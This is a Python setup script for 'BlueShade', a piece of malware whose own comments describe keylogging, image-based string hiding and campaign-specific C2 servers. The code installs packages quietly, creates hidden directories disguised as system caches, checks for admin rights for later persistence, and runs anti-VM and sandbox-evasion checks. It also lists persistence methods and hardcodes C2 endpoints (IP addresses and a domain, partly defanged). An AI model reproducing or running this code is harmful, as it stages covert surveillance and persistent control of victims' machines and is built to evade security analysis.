#!/usr/bin/env python3
# setup.py - Initializes environment and dependencies for BlueShade
# Make sure this runs first before anything else
# Last update: March 18, 2025

import os
import sys
import subprocess
import random
import time
import base64
from pathlib import Path

# List of packages we need that won't raise suspicion
REQUIRED_PACKAGES = [
    "requests",
    "cryptography",
    "pyinstaller",
    "pillow", # for hiding strings in images
    "pynput"  # for keylogging capability
]

# C2 server endpoints - change these before each campaign
# Format: [primary, backup1, backup2]
C2_SERVERS = [
    "hxxp://185.212.47.39/gate.php",
    "hxxp://bluecontrol.onlinestats[.]xyz/api/v1/check",
    "hxxp://54.22.19.65:8080/status"
]

# Persistence methods by OS
PERSISTENCE = {
    "windows": [
        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        "Scheduled Task - Daily",
        "WMI Event Subscription"
    ],
    "linux": [
        "/etc/cron.daily/",  
        "~/.bashrc append",
        "systemd user service"
    ]
}

def check_admin():
    """Check if we have admin/root - we'll need it later"""
    is_admin = False
    
    if os.name == 'nt':
        try:
            # This will throw an exception if not admin
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            is_admin = False
    else:
        # Quick check for root on *nix
        is_admin = os.geteuid() == 0
        
    return is_admin

def install_dependencies():
    """Install required packages quietly"""
    print("[*] Verifying environment...")
    
    for package in REQUIRED_PACKAGES:
        try:
            # Try to import first to avoid unnecessary installations
            __import__(package)
            print(f"[+] {package} already installed")
        except ImportError:
            print(f"[*] Installing {package}...")
            
            # Use --quiet to avoid showing a bunch of output
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "--quiet", package],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

def setup_directories():
    """Create our hidden working directory"""
    home = Path.home()
    
    # Create a hidden directory - different approaches by OS
    if os.name == 'nt':
        # Windows - hide in AppData
        working_dir = home / "AppData" / "Local" / "Microsoft" / "Windows" / "Cache"
    else:
        # Linux/Mac - hide with leading dot in home dir
        working_dir = home / ".cache" / ".system_update"
    
    # Create directory if it doesn't exist
    working_dir.mkdir(parents=True, exist_ok=True)
    
    # On Windows, set hidden attribute
    if os.name == 'nt':
        try:
            subprocess.run(['attrib', '+h', str(working_dir)], check=False)
        except:
            pass
    
    return working_dir

def test_c2_connection():
    """Check if we can reach any C2 server - don't actually connect yet"""
    print("[*] Testing outbound connectivity...")
    try:
        import requests
        # Just check internet connectivity - don't alert anyone yet
        response = requests.get("https://www.google.com", timeout=5)
        if response.status_code == 200:
            print("[+] Outbound connectivity confirmed")
            return True
    except:
        print("[!] No internet connection detected")
        return False

def anti_vm_check():
    """Basic checks to see if we're in sandbox/VM - don't want to burn our code"""
    suspicious = 0
    
    # Check for common VM usernames
    suspicious_users = ["sandbox", "virus", "malware", "test", "admin", "administrator"]
    current_user = os.getlogin().lower()
    if any(user in current_user for user in suspicious_users):
        suspicious += 1
    
    # Check for minimal RAM (most VMs have 2-4GB)
    if os.name == 'nt':
        try:
            import psutil
            ram_gb = psutil.virtual_memory().total / (1024**3)
            if ram_gb < 4:
                suspicious += 1
        except:
            pass
    
    # Sleep a bit - many sandboxes timeout after short periods
    time.sleep(random.uniform(1.5, 3.0))
    
    return suspicious < 2  # If 2+ indicators, probably in a sandbox

def main():
    """Main setup function"""
    print("[*] System setup initializing...")
    
    # Only continue if we're not in a sandbox
    if not anti_vm_check():
        print("[*] System requirements not met. Exiting.")
        return
    
    # Install dependencies
    install_dependencies()
    
    # Setup working directory
    working_dir = setup_directories()
    print(f"[+] Working directory established")
    
    # Check for connectivity
    has_connection = test_c2_connection()
    
    # Check admin status - we'll need it for persistence
    has_admin = check_admin()
    if has_admin:
        print("[+] Administrative privileges confirmed")
    else:
        print("[!] Note: Limited privileges - some features unavailable")
    
    # Create status file
    with open(working_dir / "status.dat", "w") as f:
        f.write(f"connectivity:{has_connection}\n")
        f.write(f"admin:{has_admin}\n")
        f.write(f"init:1\n")
    
    print("[+] Setup complete")
    print("[*] You can now run main.py")

if __name__ == "__main__":
    main()
